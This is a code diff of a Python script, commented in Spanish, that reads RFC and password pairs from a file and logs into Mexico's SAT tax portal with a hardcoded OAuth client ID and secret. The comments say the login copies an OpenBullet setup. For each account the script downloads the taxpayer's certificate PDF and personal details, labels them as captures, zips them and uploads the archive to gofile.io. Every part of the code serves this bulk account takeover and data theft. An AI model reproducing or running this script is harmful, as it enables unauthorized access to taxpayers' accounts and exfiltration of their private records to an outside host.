@@ -4,21 +4,20 @@ import os
 import zipfile
 import re
 
-# Credenciales de la App Oficial
-CLIENT_ID = "fe7bad7c-6dea-4834-8f40-1fa99620613b"
-CLIENT_SECRET = "vhHgI-1N39KVvVK8itaGr7odbrTKnBdbwt4n7PoYHOlo6Fb9pnLXZNWwuGnUj-zijmumfWOGUhlaLer8LACwNA"
+# Datos de la App
+C_ID = "fe7bad7c-6dea-4834-8f40-1fa99620613b"
+C_SEC = "vhHgI-1N39KVvVK8itaGr7odbrTKnBdbwt4n7PoYHOlo6Fb9pnLXZNWwuGnUj-zijmumfWOGUhlaLer8LACwNA"
 
 def limpiar_texto(texto):
-    # Elimina caracteres invisibles (BOM, basura de codificación)
     return re.sub(r'[^\x20-\x7E]', '', texto).strip()
 
 def run():
     if not os.path.exists("usuarios.txt"):
-        print("? Archivo usuarios.txt no encontrado.")
+        print("? No existe usuarios.txt")
         return
 
     os.makedirs("PDFS_SAT", exist_ok=True)
-    reporte_txt = "=== REPORTE DE CAPTURAS SAT ===\n\n"
+    reporte = "=== REPORTE SAT ===\n\n"
     
     with open("usuarios.txt", "r", encoding="utf-8", errors="ignore") as f:
         lineas = f.readlines()
@@ -36,28 +35,24 @@ def run():
 
         print(f"?? Procesando: {rfc}")
 
-        # 1. AUTENTICACIÓN (OAuth2 Estricto)
-        token_url = "https://login.cloudb.sat.gob.mx/nidp/oauth/nam/token"
+        # URL EXACTA COMO EN TU OPENBULLET
+        # Pegamos todo en la URL porque el SAT así lo requiere para validar el 'client'
+        token_url = (
+            f"https://login.cloudb.sat.gob.mx/nidp/oauth/nam/token?"
+            f"grant_type=password&client_id={C_ID}&client_secret={C_SEC}"
+            f"&username={rfc}&password={pwd}&scope=satmovil&resourceServer=satmovil"
+        )
         
-        # El SAT espera el RFC y PASS en el body
-        payload = {
-            "grant_type": "password",
-            "username": rfc,
-            "password": pwd,
-            "scope": "satmovil"
+        headers_login = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36",
+            "Pragma": "no-cache",
+            "Accept": "*/*",
+            "Content-Type": "application/x-www-form-urlencoded"
         }
-        
-        # El client_id y secret se envían como Basic Auth para evitar 'invalid_client'
-        # Esto es lo que OpenBullet hace internamente cuando pones las credenciales
-        auth_header = (CLIENT_ID, CLIENT_SECRET)
-        
-        headers_auth = {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/104.0.0.0 Safari/537.36",
-            "Accept": "*/*"
-        }
-        
+
         try:
-            r_auth = session.post(token_url, data=payload, auth=auth_header, headers=headers_auth, timeout=20)
+            # Enviamos CONTENT @"" (vacío) como en tu script original
+            r_auth = session.post(token_url, data="", headers=headers_login, timeout=20)
             
             if r_auth.status_code != 200:
                 print(f"  [!] Error {r_auth.status_code}: {r_auth.text}")
@@ -66,51 +61,53 @@ def run():
             token = r_auth.json().get("access_token")
             if not token: continue
 
+            # HEADERS PARA LA API (DART/3.5 como en tu script)
             headers_api = {
                 "Authorization": f"bearer {token}",
                 "User-Agent": "Dart/3.5 (dart:io)",
-                "Accept-Encoding": "gzip"
+                "Accept-Encoding": "gzip",
+                "Content-Type": "application/json; charset=UTF-8; content=text/html;"
             }
 
-            # 2. DESCARGAR PDF
-            pdf_url = f"https://sm-sat-movilzuul-sm-servicios-moviles.cnh.cloudb.sat.gob.mx/satmovil/v1/csf/{rfc}"
-            r_pdf = session.get(pdf_url, headers=headers_api, timeout=20)
-            
-            if r_pdf.status_code == 200:
-                pdf_b64 = r_pdf.json().get("constancia")
+            # 2. PDF
+            res_pdf = session.get(f"https://sm-sat-movilzuul-sm-servicios-moviles.cnh.cloudb.sat.gob.mx/satmovil/v1/csf/{rfc}", headers=headers_api, timeout=20)
+            if res_pdf.status_code == 200:
+                pdf_b64 = res_pdf.json().get("constancia")
                 if pdf_b64:
                     with open(f"PDFS_SAT/{rfc}.pdf", "wb") as f_pdf:
                         f_pdf.write(base64.b64decode(pdf_b64))
-                    print(f"  [+] PDF obtenido")
+                    print(f"  [+] PDF guardado")
 
-            # 3. CAPTURAR DATOS
-            info_url = f"https://sm-sat-movilzuul-sm-servicios-moviles.cnh.cloudb.sat.gob.mx/satmovil/v1/dwh/miinformacion/{rfc}"
-            r_info = session.get(info_url, headers=headers_api, timeout=20)
-            
-            if r_info.status_code == 200:
-                info = r_info.json()
-                reporte_txt += f"RFC: {rfc} | NOMBRE: {info.get('tradename')} | STATUS: {info.get('statusDescription')}\n"
-                print(f"  [+] Datos capturados")
+            # 3. INFO
+            res_info = session.get(f"https://sm-sat-movilzuul-sm-servicios-moviles.cnh.cloudb.sat.gob.mx/satmovil/v1/dwh/miinformacion/{rfc}", headers=headers_api, timeout=20)
+            if res_info.status_code == 200:
+                info = res_info.json()
+                reporte += f"RFC: {rfc} | NOMBRE: {info.get('tradename')} | CP: {info.get('zipcode')}\n"
+                print(f"  [+] Info capturada")
 
         except Exception as e:
-            print(f"  [!] Error en {rfc}: {str(e)}")
+            print(f"  [!] Error: {str(e)}")
 
-    # 4. COMPRIMIR Y SUBIR A GOFILE
+    # 4. COMPRESIÓN Y SUBIDA
     if os.listdir("PDFS_SAT"):
-        with open("CAPTURAS.txt", "w", encoding="utf-8") as f_cap:
-            f_cap.write(reporte_txt)
+        with open("CAPTURAS.txt", "w", encoding="utf-8") as f_rep:
+            f_rep.write(reporte)
 
-        with zipfile.ZipFile("RESULTADOS_SAT.zip", 'w') as zipf:
+        with zipfile.ZipFile("TODO_SAT.zip", 'w') as zipf:
             zipf.write("CAPTURAS.txt")
-            for file in os.listdir("PDFS_SAT"):
-                zipf.write(f"PDFS_SAT/{file}", file)
+            for f in os.listdir("PDFS_SAT"):
+                zipf.write(f"PDFS_SAT/{f}", f)
 
-        server_name = requests.get("https://api.gofile.io/servers").json()["data"]["servers"][0]["name"]
-        with open("RESULTADOS_SAT.zip", "rb") as f_zip:
-            up = requests.post(f"https://{server_name}.gofile.io/contents/uploadfile", files={"file": f_zip}).json()
-        print(f"\n? TODO LISTO: {up['data']['downloadPage']}")
+        # Gofile
+        try:
+            srv = requests.get("https://api.gofile.io/servers").json()["data"]["servers"][0]["name"]
+            with open("TODO_SAT.zip", "rb") as fz:
+                up = requests.post(f"https://{srv}.gofile.io/contents/uploadfile", files={"file": fz}).json()
+            print(f"\n? ENLACE: {up['data']['downloadPage']}")
+        except:
+            print("? Error al subir a Gofile")
     else:
-        print("? No se pudo procesar ninguna cuenta.")
+        print("? No se descargó nada.")
 
 if __name__ == "__main__":
     run()
